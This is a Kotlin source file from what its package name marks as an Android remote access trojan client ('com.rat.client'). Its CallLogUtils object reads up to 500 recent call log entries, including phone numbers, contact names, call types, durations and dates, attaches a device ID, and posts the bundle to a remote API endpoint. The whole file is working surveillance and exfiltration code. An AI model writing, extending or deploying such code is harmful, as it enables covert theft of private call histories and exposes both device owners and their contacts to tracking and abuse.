package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.provider.CallLog
import android.util.Log
import com.rat.client.Config
import org.json.JSONArray
import org.json.JSONObject

/**
 * Reads call logs from the device.
 */
object CallLogUtils {
    private const val TAG = "CallLogUtils"

    fun getAllCallLogs(context: Context) {
        if (!PermissionManager.hasPermissions(context, arrayOf(Manifest.permission.READ_CALL_LOG))) {
            Log.w(TAG, "Call log permission not granted")
            return
        }

        try {
            val callLogs = JSONArray()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT 500"
            )

            cursor?.use { c ->
                val numberIdx = c.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = c.getColumnIndex(CallLog.Calls.TYPE)
                val durationIdx = c.getColumnIndex(CallLog.Calls.DURATION)
                val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)

                while (c.moveToNext()) {
                    val log = JSONObject()
                    val type = if (typeIdx >= 0) c.getInt(typeIdx) else 0
                    log.put("type", when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else -> "unknown"
                    })
                    log.put("number", if (numberIdx >= 0) c.getString(numberIdx) ?: "" else "")
                    log.put("name", if (nameIdx >= 0) c.getString(nameIdx) ?: "" else "")
                    log.put("duration", if (durationIdx >= 0) c.getLong(durationIdx) else 0L)
                    log.put("date", if (dateIdx >= 0) c.getLong(dateIdx) else 0L)

                    callLogs.put(log)
                }
            }

            if (callLogs.length() > 0) {
                val payload = JSONObject()
                payload.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                payload.put("callLogs", callLogs)

                ApiClient.post(Config.Api.CALL_LOGS, payload)
                Log.d(TAG, "Sent ${callLogs.length()} call logs")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Call logs error: ${e.message}")
        }
    }
}

